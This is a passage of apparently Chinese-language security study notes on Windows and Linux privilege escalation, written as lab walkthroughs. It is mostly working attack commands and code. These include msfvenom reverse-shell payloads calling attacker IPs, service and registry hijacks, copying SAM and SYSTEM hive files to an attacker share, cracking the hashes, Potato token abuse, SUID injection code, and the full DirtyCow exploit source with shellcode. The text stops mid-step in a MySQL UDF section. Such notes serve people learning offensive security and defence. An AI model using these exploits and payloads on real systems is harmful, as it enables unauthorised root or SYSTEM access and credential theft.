[{"title":"Windows privesc","url":"/2022/11/07/Windows-privesc/","content":"\n### #0 信息收集\n\n```bash\n# 用户信息收集\n当前用户的权限：whoami /priv\n列出用户：net users\n列出用户的详细信息：net user username（e.g. net user Administrator）\n其他用户同时登录：qwinsta（与query session命令相同）\n系统上定义的用户组：net localgroup\n列出特定组的成员：net localgroup groupname（e.g. net localgroup Administrators）\n\n# 系统信息收集\nsysteminfo\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nhostname\n\n# 补丁详细情况\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# 搜索文件\nfindstr /si password *.txt\n命令分解：\nfindstr：搜索文件中的文本模式。\n/si：搜索当前目录和所有子目录（s），忽略大写/小写差异（i）\npassword：该命令将在文件中搜索字符串“密码”\n*.txt：搜索将涵盖具有 .txt 扩展名的文件\n可以根据您的需要和目标环境更改字符串和文件扩展名，但“.txt”、“.xml”、“.ini”、“*.config”和“.xls”通常是一个好地方开始。\n\n# 网络连接\nnetstat -ano\n\n# 计划任务\nschtasks：该命令可用于查询计划任务。\nschtasks /query /fo LIST /v\n\n# 驱动程序\ndriverquery\n\n# 查看杀毒软件状态\nsc query windefend\n```\n\n\n\n### #1 Tools\n\nWinPEAS：https://github.com/carlospolop/PEASS-ng\n\nPowerUp：https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\n\n```bash\n# 反向shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe\n```\n\n\n\n### #2 服务漏洞\n\n) 1 - 不安全的服务权限\n\naccesschk.exe：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk\n\n```cmd\naccesschk.exe -uwcqv \"Users\" *\t#跟下面命令相同\nC:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user *  #daclsvc服务user用户拥有更改服务配置权限(SERVICE_CHANGE_CONFIG)\nsc qc daclsvc\t#查询服务并注意它以 SYSTEM 权限 (SERVICE_START_NAME) 运行\nsc config daclsvc binpath= \"\\\"C:\\PrivEsc\\reverse.exe\\\"\"\t#修改服务配置并将 BINARY_PATH_NAME (binpath) 设置为反向shell\nnet start daclsvc\t#在 Kali 上启动一个侦听器，然后启动该服务以生成一个以 SYSTEM 权限运行的反向 shell\n```\n\n![image-20220525152423849](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525152423849.png)\n\n![image-20220525142216546](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525142216546.png)\n\n\n\n) 2 - 未引用的服务路径\n\n```cmd\nC:\\Program Files\\Unquoted Path Service>sc qc unquotedsvc\t\t#查询“ unquotedsvc” 服务，注意它以 SYSTEM 权限 (SERVICE_START_NAME) 运行，并且 BINARY_PATH_NAME 未引用并包含空格\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: unquotedsvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Unquoted Path Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n\nC:\\Program Files\\Unquoted Path Service>C:\\PrivEsc\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\\"\t\t#使用 accesschk.exe，注意 BUILTIN\\Users 组允许写入 C:\\Program Files\\Unquoted Path Service\\ 目录\nC:\\Program Files\\Unquoted Path Service\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW BUILTIN\\Users\n  RW NT SERVICE\\TrustedInstaller\n  RW NT AUTHORITY\\SYSTEM\n  RW BUILTIN\\Administrators\n\nC:\\Program Files\\Unquoted Path Service>copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\t\t#您创建的 reverse.exe 可执行文件复制到此目录并将其重命名为 Common.exe\n        1 file(s) copied.\n\nC:\\Program Files\\Unquoted Path Service>net start unquotedsvc\t\t#在 Kali 上启动一个侦听器，然后启动该服务以生成一个以 SYSTEM 权限运行的反向 shell\n```\n\n![image-20220525152457510](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525152457510.png)\n\n![image-20220525154120916](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525154120916.png)\n\n\n\n) 3 - 不安全的注册表服务\n\n```cmd\nc:\\PrivEsc>sc qc regsvc\t\t# 查询“ regsvc” 服务\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: regsvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : \"C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe\"\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Insecure Registry Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\t\t\t# 注意它以 SYSTEM 权限 (SERVICE_START_NAME) 运行\n\nc:\\PrivEsc>C:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc\nHKLM\\System\\CurrentControlSet\\Services\\regsvc\t# 使用 accesschk.exe(注意修改对应服务名称)\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW NT AUTHORITY\\SYSTEM\n        KEY_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        KEY_ALL_ACCESS\n  RW NT AUTHORITY\\INTERACTIVE\t#请注意 regsvc 服务的注册表项可由“NT  AUTHORITY\\INTERACTIVE”组（基本上所有登录用户）写入\n        KEY_ALL_ACCESS\n\nc:\\PrivEsc>reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f\nThe operation completed successfully.\n\nc:\\PrivEsc>net start regsvc\n```\n\n![image-20220525161239852](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525161239852.png)\n\n![image-20220525160834061](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525160834061.png)\n\n\n\n) 4 - 不安全的服务可执行文件\n\n![image-20220525172553728](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525172553728.png)\n\n```cmd\n# 查询“ filepermsvc” 服务\nsc qc filepermsvc\t\n\n# 使用 accesschk.exe，请注意服务二进制文件 (BINARY_PATH_NAME) 文件对所有人都是可写的\nC:\\PrivEsc\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\t\n\n#复制您创建的 reverse.exe 可执行文件并用它替换 filepermservice.exe\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" /Y\t\n\n#在 Kali 上启动一个侦听器，然后启动该服务以生成一个以 SYSTEM 权限运行的反向 shell\nnet start filepermsvc\t\n```\n\n\n\n![image-20220525170550784](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525170550784.png)\n\n\n\n### #3 注册表\n\nAutoRuns\n\n![image-20220525172120597](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525172120597.png)\n\n```cmd\n# 在注册表中查询 AutoRun 可执行文件：\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# 使用 accesschk.exe，请注意其中一个 AutoRun 可执行文件对每个人都是可写的：\nC:\\PrivEsc\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"\n\n#复制您创建的 reverse.exe 可执行文件 并用它覆盖 AutoRun 可执行文件：\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Autorun Program\\program.exe\" /Y\n\n# 在现实世界中，您必须等待管理员自己登录！\n```\n\n![image-20220525172846079](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525172846079.png)\n\n\n\n\n\nAlwaysInstallElevated\n\n![image-20220525175002143](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525175002143.png)\n\n```cmd\n# 在注册表中查询 AlwaysInstallElevated 键：\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# 请注意，两个键都设置为 1 (0x1)。\n\n#在Kali上，使用msfvenom生成反向shell Windows Installer (reverse.msi)。更新LHOST IP地址：\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.53.68 LPORT=53 -f msi -o reverse.msi\n\n# 将 reverse.msi 文件传输到 Windows 上的 C:\\PrivEsc 目录（使用之前的 SMB 服务器方法）。\ncopy \\\\10.11.53.68\\share\\reverse.msi c:\\PrivEsc\\reverse.msi\n\n#在 Kali 上启动一个监听器，然后运行安装程序以触发以 SYSTEM 权限运行的反向 shell：\nmsiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi\n```\n\n![image-20220525220104009](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525220104009.png)\n\n\n\n### #4 密码\n\n) 1 - 注册表\n\n![image-20220525224435116](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525224435116.png)\n\n```bash\n# 可以在注册表中搜索包含password一词的键和值：\nreg query HKLM /f password /t REG_SZ /s\n\n# 如果您想节省一些时间，请查询此特定密钥以查找管理员 AutoLogon 凭据：\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"\n```\n\n\n\n) 2 - 保存的凭据\n\n![image-20220526095216760](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526095216760.png)\n\n如果winPEASany没用出结果需要手动输入命令\n\n```bash\n# 列出所有保存的凭据：\ncmdkey /list\n\n# 在 Kali 上启动一个侦听器并使用 runas 和管理员用户保存的凭据运行 reverse.exe 可执行文件：\nrunas /savecred /user:admin C:\\PrivEsc\\reverse.exe\n```\n\n![image-20220525224203673](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220525224203673.png)\n\n\n\n) 3 - 安全帐户管理器 (SAM)\n\n![image-20220526095641426](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526095641426.png)\n\n```cmd\n# 将 SAM 和 SYSTEM 文件传输到您的 Kali VM：\ncopy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\\ncopy C:\\Windows\\Repair\\SYSTEM \\\\10.10.10.10\\kali\\\n\n# 在 Kali 上，克隆 creddump7 存储库（Kali 上的存储库已过时，无法正确转储 Windows 10 的哈希值！）并使用它从 SAM 和 SYSTEM 文件中转储哈希值：\ngit clone https://github.com/Tib3rius/creddump7\npip3 install pycrypto\npython3 creddump7/pwdump.py SYSTEM SAM\n\n# 使用 hashcat 破解管理员 NTLM 哈希：\nhashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt\n```\n\n![image-20220526102104852](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526102104852.png)\n\n\n\n### #5 计划任务\n\n```cmd\nschtasks /query /fo LIST /v\t\t# 任务列表\nschtasks /query /fo LIST /v | find \"Task To Run\"\t# 过滤运行的任务文件\n\n#查看 C:\\DevTools\\CleanUp.ps1 脚本的内容：\ntype C:\\DevTools\\CleanUp.ps1\n\n#该脚本似乎每分钟都以 SYSTEM 身份运行。使用 accesschk.exe，请注意您可以写入此文件：\nC:\\PrivEsc\\accesschk.exe /accepteula -quvw user C:\\DevTools\\CleanUp.ps1\n\n# 在 Kali 上启动一个侦听器，然后将一行添加到C:\\DevTools\\CleanUp.ps1 运行您创建的 reverse.exe 可执行文件：\necho C:\\PrivEsc\\reverse.exe >> C:\\DevTools\\CleanUp.ps1\n\n# 等待计划任务运行，这将触发反向 shell 作为 SYSTEM。\n```\n\n![image-20220526133707718](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526133707718.png)\n\n![image-20220526135208329](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526135208329.png)\n\n\n\n### #6 不安全的 GUI 应用程序\n\n```cmd\n# 桌面上有个画图程序，运行程序后输入\ntasklist /V | findstr mspaint.exe\n\n# 双击桌面上的“AdminPaint”快捷方式。运行后，打开命令提示符并注意 Paint 正在以管理员权限运行：\ntasklist /V | findstr mspaint.exe\n\n# 在画图中，单击“文件”，然后单击“打开”。在打开文件对话框中，点击导航输入并粘贴：\nfile://c:/windows/system32/cmd.exe\n\n# 按 Enter 以生成以管理员权限运行的命令提示符。\n```\n\n![image-20220526142759387](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526142759387.png)\n\n![image-20220526142549020](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526142549020.png)\n\n\n\n### #7 Startup 应用程序\n\n![image-20220526143354340](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526143354340.png)\n\n```cmd\n# 使用 accesschk.exe，注意 BUILTIN\\Users 组可以将文件写入 StartUp 目录：\nC:\\PrivEsc\\accesschk.exe /accepteula -d \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"\n\n#使用 cscript，运行 C:\\PrivEsc\\CreateShortcut.vbs 脚本，该脚本应该在 StartUp 目录中为您的 reverse.exe 可执行文件创建一个新的快捷方式：\ncscript C:\\PrivEsc\\CreateShortcut.vbs\n\n# 在 Kali 上启动一个监听器，然后等待管理员登录：\n# 以管理员身份运行的 shell 应连接回您的侦听器。\n```\n\n![image-20220526143837667](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220526143837667.png)\n\n\n\n### #8 令牌模拟\n\n) 1 - Rogue Potato(流氓土豆)\n\n参考文章 : https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato\n\n利用详情 : https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html\n\nTools : https://github.com/antonioCoco/RoguePotato\n\n* 本地服务权限账户\n* 启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege \n\n```cmd\n# 在您的机器上运行socat重定向（替换VICTIM_IP）：\nsocat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999\nsudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.79.228:9999\n\n# 执行 PoC（替换YOUR_IP和command）：\n.\\RoguePotato.exe -r YOUR_IP -e \"command\" -l 9999\nC:\\PrivEsc\\RoguePotato.exe -r 10.11.53.68 -e \"C:\\PrivEsc\\reverse.exe\" -l 9999\n```\n\n![image-20220527103837310](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220527103837310.png)\n\n\n\n) 2 - PrintSpoofer\n\n漏洞详细 ： https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/\n\nTools : https://github.com/itm4n/PrintSpoofer\n\n* 需要本地服务或网络服务访问\n* 启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege\n\n![image-20220527144905068](C:\\Users\\z4yn\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220527144905068.png)\n\n\n\n","tags":["提权"]},{"title":"Linux Privesc","url":"/2022/11/07/Linux-Privesc/","content":"\n### #0 枚举脚本\n\n**linpeas.sh：**https://github.com/carlospolop/PEASS-ng\n\n**LinEnum：**https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh\n\n**lse.sh：**https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh\n\n***\n\n\n\n### #1 滥用 SUID/GUID 文件\n\n- 查疑似漏洞\n\n```bash\n$ find / -perm -u=s -type f 2>/dev/null\n$ find / -perm -4000  2>/dev/null\n$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n```\n\n- exim提权\n\n```bash\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3\t#exim 可以提权\n......\n$ searchsploit -m 39535\n```\n\n- SUID-共享对象注入\n\n```bash\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so\t#可执行文件容易受到共享对象注入的影响\n......\nuser@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE \"open|access|no such file\"\t    #对文件运行strace并在输出中搜索打开/访问调用和“没有这样的文件”错误\naccess(\"/etc/suid-debug\", F_OK)         = -1 ENOENT (No such file or directory)\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY)      = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libdl.so.2\", O_RDONLY)       = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/usr/lib/libstdc++.so.6\", O_RDONLY) = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libm.so.6\", O_RDONLY)        = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libgcc_s.so.1\", O_RDONLY)    = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libc.so.6\", O_RDONLY)        = 3\nopen(\"/home/user/.config/libcalc.so\", O_RDONLY) = -1 ENOENT (No such file or directory)\t\t#请注意，可执行文件尝试在我们的主目录中加载/home/user/.config/libcalc.so共享对象，但找不到它\n\nuser@debian:~$ cat /home/user/tools/suid/libcalc.c\t\t#libcalc.c 源码\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n\tsetuid(0);\n\tsystem(\"/bin/bash -p\");\n}\n\n$ mkdir /home/user/.config\t\t#为 libcalc.so 文件创建.config目录\n$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c\t#将代码编译到suid-so可执行文件所在位置的共享对象中\n$ /usr/local/bin/suid-so\t#执行suid-so可执行文件\nCalculating something, please wait...\nbash-4.1# id\nuid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n```\n\n- SUID-环境变量\n\n```bash\n#/usr/local/bin/suid-env可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env\t\n......\n\nuser@debian:~$ /usr/local/bin/suid-env\t#执行该文件并注意它似乎正在尝试启动apache2网络服务器\n[....] Starting web server: apache2httpd (pid 1623) already running\n. ok \n\nuser@debian:~$ strings /usr/local/bin/suid-env\t#strings在文件上运行字符串以查找可打印字符的字符串\n.....\nfff.\nfffff.\nl$ L\nt$(L\n|$0H\nservice apache2 start\t#一行（“service apache2 start”）表明正在调用服务可执行文件来启动网络服务器，但未使用可执行文件的完整路径（/usr/sbin/service）。\n\nuser@debian:~$ cat /home/user/tools/suid/service.c\t#service.c源码\nint main() {\n\tsetuid(0);\n\tsystem(\"/bin/bash -p\");\n}\n\nuser@debian:~$ gcc -o service /home/user/tools/suid/service.c\t#编译\nuser@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env\t#将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量中，然后运行suid-env可执行文件以获得 root shell\nroot@debian:~# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n```\n\n- SUID-滥用Shell功能\n\n```bash\n#/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它使用服务可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器。\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2\n......\n\nuser@debian:~$ strings /usr/local/bin/suid-env2\t\t#strings在文件上运行字符串以查找可打印字符的字符串\n......\nfff.\nfffff.\nl$ L\nt$(L\n|$0H\n/usr/sbin/service apache2 start\t\t#可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器\n\n#在Bash版本<4.2-048，可以定义名称类似于文件路径的 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。\nuser@debian:~$ /bin/bash --version\t\t#查看Bash版本\nGNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)\nCopyright (C) 2009 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\n#创建一个名为“ /usr/sbin/service ”的 Bash 函数，该函数执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数\nuser@debian:~$ function /usr/sbin/service { /bin/bash -p; } \nuser@debian:~$ export -f /usr/sbin/service\nuser@debian:~$ /usr/local/bin/suid-env2\t\t#运行suid-env2可执行文件以获取 root shell\nroot@debian:~# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n```\n\n***\n\n\n\n### #2 sudo提权\n\nhttps://gtfobins.github.io/\n\n```bash\nsudo -l\n```\n\n***\n\n\n\n### #3 内核提权\n\n**枚举脚本：**\n\nhttps://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh\n\nhttps://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl\n\n- dirctycow(脏牛提权 exp)\n\n```c\nuser@debian:~/tools/kernel-exploits$ cat /home/user/tools/kernel-exploits/dirtycow/c0w.c\n/*\n* A PTRACE_POKEDATA variant of CVE-2016-5195\n* should work on RHEL 5 & 6\n* \n* (un)comment correct payload (x86 or x64)!\n* $ gcc -pthread c0w.c  -o c0w\n* $ ./c0w\n* DirtyCow root privilege escalation\n* Backing up /usr/bin/passwd.. to /tmp/bak\n* mmap fa65a000\n* madvise 0\n* ptrace 0\n* $ /usr/bin/passwd \n* [root@server foo]# whoami \n* root\n* [root@server foo]# id\n* uid=0(root) gid=501(foo) groups=501(foo)\n* @KrE80r\n*/\n#include <fcntl.h>\n#include <pthread.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <unistd.h>\n\nint f;\nvoid *map;\npid_t pid;\npthread_t pth;\nstruct stat st;\n\n// change if no permissions to read\nchar suid_binary[] = \"/usr/bin/passwd\";\n\n/*\n* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i\n*/ \nunsigned char shell_code[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,\n  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,\n  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,\n  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,\n  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n};\nunsigned int sc_len = 177;\n\n/*\n* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i\nunsigned char shell_code[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,\n  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,\n  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,\n  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,\n  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,\n  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,\n  0x89, 0xe1, 0xcd, 0x80\n};\nunsigned int sc_len = 136;\n*/\n\nvoid *madviseThread(void *arg) {\n  int i,c=0;\n  for(i=0;i<200000000;i++)\n    c+=madvise(map,100,MADV_DONTNEED);\n  printf(\"madvise %d\\n\\n\",c);\n}\n\n\nint main(int argc,char *argv[]){\n\n  printf(\"                                \\n\\\n   (___)                                   \\n\\\n   (o o)_____/                             \\n\\\n    @@ `     \\\\                            \\n\\\n     \\\\ ____, /%s                          \\n\\\n     //    //                              \\n\\\n    ^^    ^^                               \\n\\\n\", suid_binary);\n  char *backup;\n  printf(\"DirtyCow root privilege escalation\\n\");\n  printf(\"Backing up %s to /tmp/bak\\n\", suid_binary);\n  asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n  system(backup);\n\n  f=open(suid_binary,O_RDONLY);\n  fstat(f,&st);\n  map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);\n  printf(\"mmap %x\\n\\n\",map);\n  pid=fork();\n  if(pid){\n    waitpid(pid,NULL,0);\n    int u,i,o,c=0,l=sc_len;\n    for(i=0;i<10000/l;i++)\n      for(o=0;o<l;o++)\n        for(u=0;u<10000;u++)\n          c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));\n    printf(\"ptrace %d\\n\\n\",c);\n   }\n  else{\n    pthread_create(&pth,\n                   NULL,\n                   madviseThread,\n                   NULL);\n    ptrace(PTRACE_TRACEME);\n    kill(getpid(),SIGSTOP);\n    pthread_join(pth,NULL);\n    }\n  return 0;\n}\n```\n\n![image-20220519152241925](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/faae7eb947602f5192ad9fbdec6c3652.png)\n\n***\n\n\n\n### #4 服务提权\n\n- Mysql UDF提权：https://www.exploit-db.com/exploits/1518\n\n\n```bash\nmysql> show global variables like \"secure%\";\t#查看是否有上传权限\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\t#secure_file_priv值需要为空\n+------------------+-------+\n2 rows in set (0.00 sec)\n\n\n$ searchsploit -m 1518  #获取exp\n$ mv 1518.c raptor_udf2.c\t#重命名\n$ gcc -g -c raptor_udf2.c\t#编译\n$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n\n$ mysql -u root -p\t\t#登录Mysql\nmysql> 